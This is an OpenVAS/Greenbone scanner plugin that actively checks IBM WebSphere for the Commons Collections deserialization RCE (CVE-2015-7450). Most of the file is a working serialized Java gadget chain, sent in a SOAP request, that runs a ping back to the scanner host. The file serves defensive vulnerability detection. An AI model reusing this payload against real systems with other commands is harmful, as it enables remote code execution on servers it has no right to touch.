# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ibm:websphere_application_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105835");
  script_version("2024-11-15T05:05:36+0000");
  script_tag(name:"last_modification", value:"2024-11-15 05:05:36 +0000 (Fri, 15 Nov 2024)");
  script_tag(name:"creation_date", value:"2016-07-29 15:54:10 +0200 (Fri, 29 Jul 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-24 17:02:03 +0000 (Wed, 24 Jul 2024)");

  script_cve_id("CVE-2015-7450");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("IBM WebSphere Application Server RCE Vulnerability (Nov 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_ibm_websphere_consolidation.nasl", "os_detection.nasl");
  script_mandatory_keys("ibm/websphere/http/detected");
  script_require_ports("Services/www", 9443);

  script_tag(name:"summary", value:"IBM WebSphere Application Server is prone to a remote code
  execution (RCE) vulnerability in Apache Commons Collections.");

  script_tag(name:"vuldetect", value:"Sends a serialized object via a crafted HTTP POST request and
  checks if the target is connecting back to the scanner host.

  Note: For a successful detection of this flaw the scanner host needs to be able to directly
  receive ICMP echo requests from the target.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute
  arbitrary code in the context of the affected application.");

  script_tag(name:"affected", value:"IBM WebSphere Application Server versions:

  - 8.5 and 8.5.5 (Traditional and Liberty)

  - 7.0 and 8.0 (Traditional only)");

  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor
  advisory for more information.");

  script_xref(name:"URL", value:"https://www.ibm.com/support/pages/security-bulletin-vulnerability-apache-commons-affects-ibm-websphere-application-server-cve-2015-7450");
  script_xref(name:"URL", value:"https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210122210651/http://www.securityfocus.com/bid/77653");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("dump.inc");
include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("list_array_func.inc");
include("pcap_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );
filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );

url = "/";
headers = make_array( "Content-Type", "text/xml; charset=utf-8",
                      "SOAPAction", '"urn:AdminService"' );

if( os_host_runs( "Windows") == "yes" )
  target_runs_windows = TRUE;

foreach connect_back_target( make_list( ownip, ownhostname ) ) {

  payload = raw_string(
    0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x32, 0x73, 0x75, 0x6e, 0x2e, 0x72, 0x65, 0x66, 0x6c,
    0x65, 0x63, 0x74, 0x2e, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2e, 0x41,
    0x6e, 0x6e, 0x6f, 0x74, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x76, 0x6f, 0x63, 0x61, 0x74,
    0x69, 0x6f, 0x6e, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x55, 0xca, 0xf5, 0x0f, 0x15, 0xcb,
    0x7e, 0xa5, 0x02, 0x00, 0x02, 0x4c, 0x00, 0x0c, 0x6d, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x56, 0x61,
    0x6c, 0x75, 0x65, 0x73, 0x74, 0x00, 0x0f, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x75, 0x74, 0x69,
    0x6c, 0x2f, 0x4d, 0x61, 0x70, 0x3b, 0x4c, 0x00, 0x04, 0x74, 0x79, 0x70, 0x65, 0x74, 0x00, 0x11,
    0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x43, 0x6c, 0x61, 0x73, 0x73,
    0x3b, 0x78, 0x70, 0x73, 0x7d, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0d, 0x6a, 0x61, 0x76, 0x61, 0x2e,
    0x75, 0x74, 0x69, 0x6c, 0x2e, 0x4d, 0x61, 0x70, 0x78, 0x72, 0x00, 0x17, 0x6a, 0x61, 0x76, 0x61,
    0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x72, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x2e, 0x50, 0x72,
    0x6f, 0x78, 0x79, 0xe1, 0x27, 0xda, 0x20, 0xcc, 0x10, 0x43, 0xcb, 0x02, 0x00, 0x01, 0x4c, 0x00,
    0x01, 0x68, 0x74, 0x00, 0x25, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f,
    0x72, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x2f, 0x49, 0x6e, 0x76, 0x6f, 0x63, 0x61, 0x74, 0x69,
    0x6f, 0x6e, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x3b, 0x78, 0x70, 0x73, 0x71, 0x00, 0x7e,
    0x00, 0x00, 0x73, 0x72, 0x00, 0x2a, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65,
    0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74,
    0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x6d, 0x61, 0x70, 0x2e, 0x4c, 0x61, 0x7a, 0x79, 0x4d, 0x61, 0x70,
    0x6e, 0xe5, 0x94, 0x82, 0x9e, 0x79, 0x10, 0x94, 0x03, 0x00, 0x01, 0x4c, 0x00, 0x07, 0x66, 0x61,
    0x63, 0x74, 0x6f, 0x72, 0x79, 0x74, 0x00, 0x2c, 0x4c, 0x6f, 0x72, 0x67, 0x2f, 0x61, 0x70, 0x61,
    0x63, 0x68, 0x65, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2f, 0x63, 0x6f, 0x6c, 0x6c,
    0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72,
    0x6d, 0x65, 0x72, 0x3b, 0x78, 0x70, 0x73, 0x72, 0x00, 0x3a, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70,
    0x61, 0x63, 0x68, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c,
    0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x6f, 0x72,
    0x73, 0x2e, 0x43, 0x68, 0x61, 0x69, 0x6e, 0x65, 0x64, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f,
    0x72, 0x6d, 0x65, 0x72, 0x30, 0xc7, 0x97, 0xec, 0x28, 0x7a, 0x97, 0x04, 0x02, 0x00, 0x01, 0x5b,
    0x00, 0x0d, 0x69, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x73, 0x74,
    0x00, 0x2d, 0x5b, 0x4c, 0x6f, 0x72, 0x67, 0x2f, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2f, 0x63,
    0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2f, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f,
    0x6e, 0x73, 0x2f, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x3b, 0x78,
    0x70, 0x75, 0x72, 0x00, 0x2d, 0x5b, 0x4c, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68,
    0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63,
    0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65,
    0x72, 0x3b, 0xbd, 0x56, 0x2a, 0xf1, 0xd8, 0x34, 0x18, 0x99, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00,
    0x00, 0x00, 0x05, 0x73, 0x72, 0x00, 0x3b, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68,
    0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63,
    0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x6f, 0x72, 0x73, 0x2e, 0x43,
    0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d,
    0x65, 0x72, 0x58, 0x76, 0x90, 0x11, 0x41, 0x02, 0xb1, 0x94, 0x02, 0x00, 0x01, 0x4c, 0x00, 0x09,
    0x69, 0x43, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76,
    0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3b, 0x78, 0x70,
    0x76, 0x72, 0x00, 0x11, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x52, 0x75,
    0x6e, 0x74, 0x69, 0x6d, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x78, 0x70, 0x73, 0x72, 0x00, 0x3a, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65,
    0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74,
    0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x6f, 0x72, 0x73, 0x2e, 0x49, 0x6e,
    0x76, 0x6f, 0x6b, 0x65, 0x72, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72,
    0x87, 0xe8, 0xff, 0x6b, 0x7b, 0x7c, 0xce, 0x38, 0x02, 0x00, 0x03, 0x5b, 0x00, 0x05, 0x69, 0x41,
    0x72, 0x67, 0x73, 0x74, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e,
    0x67, 0x2f, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3b, 0x4c, 0x00, 0x0b, 0x69, 0x4d, 0x65, 0x74,
    0x68, 0x6f, 0x64, 0x4e, 0x61, 0x6d, 0x65, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f,
    0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x5b, 0x00, 0x0b, 0x69,
    0x50, 0x61, 0x72, 0x61, 0x6d, 0x54, 0x79, 0x70, 0x65, 0x73, 0x74, 0x00, 0x12, 0x5b, 0x4c, 0x6a,
    0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x3b, 0x78,
    0x70, 0x75, 0x72, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67,
    0x2e, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3b, 0x90, 0xce, 0x58, 0x9f, 0x10, 0x73, 0x29, 0x6c,
    0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x02, 0x74, 0x00, 0x0a, 0x67, 0x65, 0x74, 0x52,
    0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x75, 0x72, 0x00, 0x12, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61,
    0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x3b, 0xab, 0x16, 0xd7, 0xae,
    0xcb, 0xcd, 0x5a, 0x99, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x00, 0x74, 0x00, 0x09,
    0x67, 0x65, 0x74, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x75, 0x71, 0x00, 0x7e, 0x00, 0x1e, 0x00,
    0x00, 0x00, 0x02, 0x76, 0x72, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67,
    0x2e, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0xa0, 0xf0, 0xa4, 0x38, 0x7a, 0x3b, 0xb3, 0x42, 0x02,
    0x00, 0x00, 0x78, 0x70, 0x76, 0x71, 0x00, 0x7e, 0x00, 0x1e, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x16,
    0x75, 0x71, 0x00, 0x7e, 0x00, 0x1b, 0x00, 0x00, 0x00, 0x02, 0x70, 0x75, 0x71, 0x00, 0x7e, 0x00,
    0x1b, 0x00, 0x00, 0x00, 0x00, 0x74, 0x00, 0x06, 0x69, 0x6e, 0x76, 0x6f, 0x6b, 0x65, 0x75, 0x71,
    0x00, 0x7e, 0x00, 0x1e, 0x00, 0x00, 0x00, 0x02, 0x76, 0x72, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61,
    0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x70, 0x76, 0x71, 0x00, 0x7e, 0x00, 0x1b, 0x73,
    0x71, 0x00, 0x7e, 0x00, 0x16, 0x75, 0x72, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2e,
    0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0xad, 0xd2, 0x56, 0xe7,
    0xe9, 0x1d, 0x7b, 0x47, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x01, 0x74, 0x00 );

  vtstrings = get_vt_strings();
  check = vtstrings["ping_string"];
  pattern = hexstr( check );

  if( target_runs_windows )
    cmd = "ping -n 5 " + connect_back_target;
  else
    cmd = "ping -c 5 -p " + pattern + " " + connect_back_target;

  len = raw_string( strlen( cmd ) );

  payload += len + cmd + raw_string(
    0x74, 0x00, 0x04, 0x65, 0x78, 0x65, 0x63, 0x75, 0x71, 0x00, 0x7e, 0x00, 0x1e, 0x00, 0x00, 0x00,
    0x01, 0x71, 0x00, 0x7e, 0x00, 0x23, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x11, 0x73, 0x72, 0x00, 0x11,
    0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x49, 0x6e, 0x74, 0x65, 0x67, 0x65,
    0x72, 0x12, 0xe2, 0xa0, 0xa4, 0xf7, 0x81, 0x87, 0x38, 0x02, 0x00, 0x01, 0x49, 0x00, 0x05, 0x76,
    0x61, 0x6c, 0x75, 0x65, 0x78, 0x72, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e,
    0x67, 0x2e, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x86, 0xac, 0x95, 0x1d, 0x0b, 0x94, 0xe0, 0x8b,
    0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x01, 0x73, 0x72, 0x00, 0x11, 0x6a, 0x61, 0x76,
    0x61, 0x2e, 0x75, 0x74, 0x69, 0x6c, 0x2e, 0x48, 0x61, 0x73, 0x68, 0x4d, 0x61, 0x70, 0x05, 0x07,
    0xda, 0xc1, 0xc3, 0x16, 0x60, 0xd1, 0x03, 0x00, 0x02, 0x46, 0x00, 0x0a, 0x6c, 0x6f, 0x61, 0x64,
    0x46, 0x61, 0x63, 0x74, 0x6f, 0x72, 0x49, 0x00, 0x09, 0x74, 0x68, 0x72, 0x65, 0x73, 0x68, 0x6f,
    0x6c, 0x64, 0x78, 0x70, 0x3f, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77, 0x08, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x78, 0x78, 0x76, 0x72, 0x00, 0x12, 0x6a, 0x61, 0x76, 0x61,
    0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x4f, 0x76, 0x65, 0x72, 0x72, 0x69, 0x64, 0x65, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x70, 0x71, 0x00, 0x7e, 0x00, 0x3a );

  payload = base64( str:payload );

  soap = '<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.1" ns0:JMXMessageVersion="1.2.0" ns0:SecurityEnabled="true" ns0:JMXVersion="1.2.0">
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:getAttribute xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<objectname xsi:type="ns1:javax.management.ObjectName">' + payload  + '</objectname>
<attribute xsi:type="xsd:string">ringBufferSize</attribute>
</ns1:getAttribute>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>';

  req = http_post_put_req( port:port, url:url, data:soap, add_headers:headers );

  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
  # vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
  # the fork would be done after calling open_sock_tcp() the child's would share the same socket
  # causing race conditions and similar.
  if( ! soc = open_sock_tcp( port ) )
    continue;

  res = send_capture( socket:soc, data:req, timeout:5, pcap_filter:filter );

  close( soc );

  if( ! res )
    continue;

  type = get_icmp_element( icmp:res, element:"icmp_type" );
  if( ! type || type != 8 )
    continue;

  # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
  # should be always there. In addition at least standard Linux and Windows systems are always
  # sending data so it should be safe to check this here.
  if( ! data = get_icmp_element( icmp:res, element:"data" ) )
    continue;

  if( ( target_runs_windows || check >< data ) ) {
    report = http_report_vuln_url( port:port, url:url );
    report += '\n\nBy sending a special crafted serialized java object it was possible to execute `' + cmd  + '` on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit( 0 );
